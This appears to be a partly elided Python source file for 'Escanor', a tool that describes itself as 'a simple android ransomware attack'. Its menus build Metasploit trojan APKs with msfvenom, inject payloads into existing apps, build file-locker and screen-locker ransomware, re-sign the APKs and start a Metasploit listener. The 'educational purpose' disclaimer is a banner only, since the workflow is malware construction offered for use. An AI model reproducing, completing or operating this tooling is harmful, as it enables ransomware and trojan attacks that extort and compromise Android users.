...
try:
    ...
    exit(f'''
{escanor} : It seems there is a module that you have not installed
...
def banner():
    ...
    #                                                                                       # 
    #                            ***********************                                    #
    #     Tools for cyber        * Copyrit of          *                                    #
    #         Security           *     Salvatore       *     version 1.0                    #  #this tool for educational purpoese!! 
    #                            ***********************                                    #
    #########################################################################################
...
def replace_string(oldstr, newstr, file):
    text = f'{escanor} : add \'{d}{truncates(newstr)}{w}\' on \'{d}{os.path.basename(file)}{w}\' ... '
...
def add_new_icon(icon, path):
    text = f'{escanor} : add \'{d}ic_launcher.png{w}\' into \'{d}mipmap-hdpi-v4{w}\' ... '
    ...
    print(text + f'{g}done{w}')
    text = f'{escanor} : add \'{d}ic_launcher.png{w}\' into \'{d}AndroidManifest.xml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_version_code(cstr, path):
    text = f'{escanor} : add \'{d}{cstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_version_name(nstr, path):
    text = f'{escanor} : add \'{d}{nstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def rename_dir(olddir, newdir):
    text = f'{escanor} : rename \'{d}{olddir.split("/")[-1]}{w}\' into \'{d}{newdir.split("/")[-1]}{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
...
def upload_file(file):
    prints(f'''
{escanor} ==> do you want to upload \'{g}{file}{w}\' ?
         
         {1}=> yes, i have upload link
         {2}=> no thanks
    ''')
    asks = str(input(f'{user} : '))
    if asks in ('2', '02'): return False
    text = f'{escanor} : upload \'{d}{file}{w}\' into the link ...'
    print(text + f'{y}wait{w}', end='\r')
    ...
    print(text + f'{g}done{w}')
    prints(f'''
{escanor} ==> your file has been successfully uploaded,
...
def generate_trojan(host, port, name = None):
    ...
    text = f'{escanor} : generate \'{d}{name}.apk{w}\' using msfvenom{w} ... '
    print(text + f'{y}wait{w}', end='\r')
...
def generate_infected_trojan(host, port, orig):
    ...
    text = f'{escanor} : infection \'{g}{name}.apk{w}\' using msfvenom{w} ... '
    ...
    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
    text = f'{escanor} : infection \'{g}{name}-infected.apk{w}\' using msfvenom{w} ... '
    print('\n' + w + text + f'{g}done{w}')
    return file
...
def genertare_screen_locker(name, head, desc, keys, icon):
    ...
    print(f'{escanor} : add \'{d}{keys}{w}\' as passprhase ... {y}wait{w}', end='\r')
    replace_strings('app_keys', keys, f'{path}/smali/com/termuxhackers/id/MyService$100000000.smali')
    print(f'{escanor} : add \'{d}{keys}{w}\' as \'{d}passprhase{w}\' ... {g}done{w}')
    text = f'{escanor} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
    print(text + f'{y}wait{w}', end='\r')
    for line in os.popen(f'find -O3 -L {path} -name \'ic_launcher.png\'', 'r').read().splitlines():
        if os.path.isfile(line):
            with Image.open(line) as f:
...
def start_trojan_listener(host, port):
    prints(f'''
{escanor} ==> redirecting to the metasploit console
...
def uber_apk_signer(file):
    text = f'{escanor} : signing \'{d}{file}{w}\' using uber-apk-signer ... '
    print(text + f'{y}wait{w}', end='\r')
...
def decompile(file):
    text = f'{escanor} : decompile \'{d}{file}{w}\' using apktool ... '
...
def recompile(path):
    text = f'{escanor} : recompile \'{d}{path}{w}\' using apktool ... '
    file = path + '.apk'
    print(text + f'{y}wait{w}', end='\r')
...
class __escanor__:
    ...
    def custom_trojan(self):
        banner()
        prints(f'''
{escanor} ==> you can fill or leave blank for using
        ...
        prints(f'''
{escanor} ==> well this process takes a few minutes,
        ...
        upload_file(apps)
        if not os.path.isfile(apps): exit(f'\n{escanor} : sorry, failed to build \'{d}{apps}{w}\' :( \n')
        prints(f'''
{escanor} ==>your trojan apps successfully created
        ...
        else: exit(f'\n{escanor} : process completed successfully ...\n')
        start_trojan_listener(host, port)

    def infect_trojan(self):
        banner()
        prints(f'''
{escanor} ==> you can fill or leave blank for using default config
        ...
        if not os.path.isfile(orig): exit(f'{escanor} : file \'{d}{orig}{w}\' doesn\'t exist !')
        host = str(input(f'         set app host => '))
        if not host: host = self.ipv4
        port = str(input(f'         set app port => '))
        if not port: port = '4444'
...
{escanor} ==> well this process takes a few minutes,
        ...
        upload_file(file)
        if not os.path.isfile(file): exit(f'\n{escanor} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{escanor} ==> your trojan apps successfully created
...
{escanor} ==> well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{escanor} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{escanor} ==> your file locker apps successfully created
...
{escanor} ==> you can fill or leave blank for using default config
         ...
         desc = \'{r}locked by escanor@termuxhackers-id{w}\'
        ...
        desc = str(input(f'         set app desc => '))
        if not desc: desc = 'locked by escanor@termuxhackers-id'
        icon = str(input(f'         set app icon => '))
        if not os.path.isfile(icon): icon = 'data/tmp/icon.png'
...
{escanor} ==> well this process takes a few minutes,
        ...
        if not os.path.isfile(file): exit(f'\n{escanor} : sorry, failed to build \'{d}{file}{w}\' :( \n')
        prints(f'''
{escanor} ==> your screen locker apps successfully created
         the application is saved as \'{g}{file}{w}\'
    ...
    def menu(self):
        banner()
        prints(f'''
{escanor} ==> Hi cyber , welcome to @Escanor =>)

{escanor} ==> Escanor is a simple android ransomware attack
         this tool is made for education purpose only
         this tool for cyber security 

{escanor} ==> can i help you ?
         
         {1}=>build trojan ransomware (metasploit)
         {2}=> build locker ransomware (filelocker)
         {3}=> build screen ransomware (screenlock)
         {4}=> exit!
        ''')
        while True:
            ...
            if main in ('1', '01'):
                banner()
                prints(f'''
{Escanor} ==> ok, you can choose one ...

         {1}=> build custom trojan (metasploit)
         {2}=> build trojan and infect (metasploit)
         {3}=> back to previous
                ''')
                while True:
                    ...
                    else: print(f'{escanor} : sorry, no command found for: {main_menu}'); continue
                    break
            elif main in ('2', '02'): self.custom_file_locker()
            elif main in ('3', '03'): self.custom_screen_locker()
            elif main in ('4', '04', 'exit'): exit(1)
            else: print(f'{escanor} : sorry, no command found for: {main}'); continue
            break
        input(f'{escanor} : press enter for back to \'{g}main menu{w}\' (enter) ')
        self.menu()

if __name__ == '__main__':
    try: __escanor__().menu()
